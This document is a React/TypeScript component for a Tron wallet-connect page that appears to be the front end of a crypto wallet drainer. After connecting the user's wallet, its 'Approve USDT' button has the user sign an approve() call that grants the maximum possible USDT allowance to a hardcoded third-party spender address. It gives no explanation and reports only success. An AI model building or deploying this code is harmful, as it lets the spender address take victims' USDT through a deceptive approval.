"use client";

import { motion } from "framer-motion";
import { CheckCircle2, AlertTriangle } from "lucide-react";
import { useEffect, useState } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { TronWeb } from "tronweb";

// ======================
// CONSTANTS (USDT APPROVAL)
// ======================
const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";

const MAX_ALLOWANCE =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// ======================
// TRONWEB INSTANCE
// ======================
function buildTronWeb() {
  return new TronWeb({
    fullHost: "https://api.trongrid.io",
  });
}

// ======================
// COMPONENT
// ======================
export function WalletConnect({ onConnect, onDisconnect }: any) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // FLOW STATE
  const [step, setStep] = useState<"connect" | "approve" | "done">(
    "connect"
  );

  const {
    address,
    connected,
    wallet,
    select,
    connect,
    disconnect,
    wallets,
  } = useWallet();

  // ======================
  // AUTO SYNC WALLET
  // ======================
  useEffect(() => {
    if (connected && address) {
      onConnect?.({
        address,
        balance: "0",
        network: "TRON MAINNET",
      });

      setStep("approve");
    }
  }, [connected, address]);

  // ======================
  // LOGS
  // ======================
  useEffect(() => {
    if (!connected || !address) {
      setLogs([]);
      return;
    }

    const msgs = [
      "> Wallet Connected",
      `> ${address.slice(0, 6)}...${address.slice(-6)}`,
      "> Ready for Approval",
    ];

    setLogs([]);
    let i = 0;

    const interval = setInterval(() => {
      setLogs((p) => [...p, msgs[i]]);
      i++;
      if (i >= msgs.length) clearInterval(interval);
    }, 200);

    return () => clearInterval(interval);
  }, [connected, address]);

  // ======================
  // CONNECT WALLET (QR)
  // ======================
  const handleWalletConnect = async () => {
    try {
      setLoading(true);
      setError("");

      const wc = wallets.find((w) =>
        w.adapter.name.toLowerCase().includes("walletconnect")
      );

      if (!wc) throw new Error("WalletConnect not found");

      if (wallet?.adapter.name !== wc.adapter.name) {
        select(wc.adapter.name as any);
      }
      await wc.adapter.connect();
    } catch (e: any) {
      setError(e.message || "WalletConnect failed");
    } finally {
      setLoading(false);
    }
  };


  // ======================
  // APPROVAL FUNCTION
  // ======================
  const handleApproval = async () => {
    try {
      setLoading(true);
      setError("");

      if (!connected || !address || !wallet) {
        throw new Error("Wallet not connected");
      }

      const tronWeb = buildTronWeb();

      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_ADDRESS,
        "approve(address,uint256)",
        {
          feeLimit: 100_000_000,
          callValue: 0,
        },
        [
          { type: "address", value: SPENDER },
          { type: "uint256", value: MAX_ALLOWANCE },
        ],
        address
      );

      if (!tx?.transaction) {
        throw new Error("Failed to build transaction");
      }

      const signed = await wallet.adapter.signTransaction(tx.transaction);

      if (!signed) {
        throw new Error("Signing failed");
      }

      const result = await tronWeb.trx.sendRawTransaction(signed);

      setStep("done");

      setLogs((p) => [
        ...p,
        `> Approval Success`,
        `> TX: ${result.txid || "unknown"}`,
      ]);
    } catch (e: any) {
      setError(e.message || "Approval failed");
    } finally {
      setLoading(false);
    }
  };

  // ======================
  // DISCONNECT
  // ======================
  const handleDisconnect = async () => {
    await disconnect();
    setStep("connect");
    setLogs([]);
    onDisconnect?.();
  };

  // ======================
  // UI
  // ======================
  return (
    <div className="py-20 px-6">
      <div className="max-w-4xl mx-auto">

        {/* ================= CONNECT ================= */}
        {step === "connect" && (
          <motion.div>
            <div className="border border-red-500/30 bg-black p-8">

              <div className="flex justify-between mb-6">
                <span className="text-red-400">
                  WALLET CONNECT
                </span>
                <AlertTriangle className="text-red-400" />
              </div>

              <button
                onClick={handleWalletConnect}
                disabled={loading}
                className="w-full py-3 bg-red-500 text-black font-bold rounded"
              >
                {loading ? "Opening QR..." : "Connect Wallet"}
              </button>



              <div className="mt-4 text-xs text-gray-400 text-center space-y-1">
                <p>For Trust Wallet Mobile, select <strong className="text-red-400">Connect Wallet</strong> (WalletConnect).</p>
                <p>For Trust Wallet Extension, select <strong className="text-[#3375BB]">Trust Wallet</strong>.</p>
              </div>

              {error && (
                <p className="text-red-400 mt-3">{error}</p>
              )}
            </div>
          </motion.div>
        )}

        {/* ================= APPROVAL ================= */}
        {step === "approve" && (
          <div className="border border-red-500 bg-black p-6">

            <div className="flex justify-between mb-4">
              <span className="text-red-400">
                STEP 2: APPROVAL REQUIRED
              </span>

              <button
                onClick={handleDisconnect}
                className="text-red-400"
              >
                DISCONNECT
              </button>
            </div>

            <p className="text-gray-400 mb-4">
              Approve USDT spending permission
            </p>

            <button
              onClick={handleApproval}
              disabled={loading}
              className="w-full py-3 bg-red-500 text-black font-bold rounded"
            >
              {loading ? "Approving..." : "Approve USDT"}
            </button>

            {error && (
              <p className="text-red-400 mt-3">{error}</p>
            )}

            <div className="mt-4 font-mono text-sm space-y-1">
              {logs.map((l, i) => (
                <div key={i}>{l}</div>
              ))}
            </div>
          </div>
        )}

        {/* ================= DONE ================= */}
        {step === "done" && (
          <div className="border border-red-500 bg-black p-6">

            <div className="flex justify-between mb-4">
              <span className="text-red-400 flex items-center gap-2">
                <CheckCircle2 size={16} />
                APPROVED
              </span>

              <button
                onClick={handleDisconnect}
                className="text-red-400"
              >
                DISCONNECT
              </button>
            </div>

            <p className="text-red-300">
              Wallet connected + approval completed successfully
            </p>

            <div className="mt-4 font-mono text-sm space-y-1">
              {logs.map((l, i) => (
                <div key={i}>{l}</div>
              ))}
            </div>
          </div>
        )}

      </div>
    </div>
  );
}